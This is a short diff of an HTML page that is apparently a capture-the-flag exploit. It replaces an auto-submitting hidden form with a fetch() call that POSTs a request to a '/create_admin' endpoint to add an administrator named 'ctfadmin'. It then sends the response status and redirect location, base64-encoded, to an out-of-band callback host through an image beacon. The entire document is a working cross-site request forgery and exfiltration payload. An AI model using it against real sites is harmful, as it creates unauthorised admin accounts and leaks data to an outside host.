@@ -1,13 +1,21 @@
 <html>
 <body>
-<form id=f action="/create_admin" method="POST">
-  <input name="new_admin_login" value="ctfadmin">
-</form>
 <script>
-f.submit();
-setTimeout(()=>{
-  location.href="https://abcd1234.oast.site/done";
-},1000);
+fetch("https://tasks.goidactf.ru:20199/create_admin",{
+  method:"POST",
+  headers:{
+    "Content-Type":"application/x-www-form-urlencoded"
+  },
+  body:"new_admin_login=ctfadmin",
+  redirect:"manual"
+})
+.then(r=>{
+  let data =
+    "status=" + r.status +
+    "|loc=" + r.headers.get("Location");
+  new Image().src =
+    "https://" + btoa(data) + "zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
+});
 </script>
 </body>
 </html>
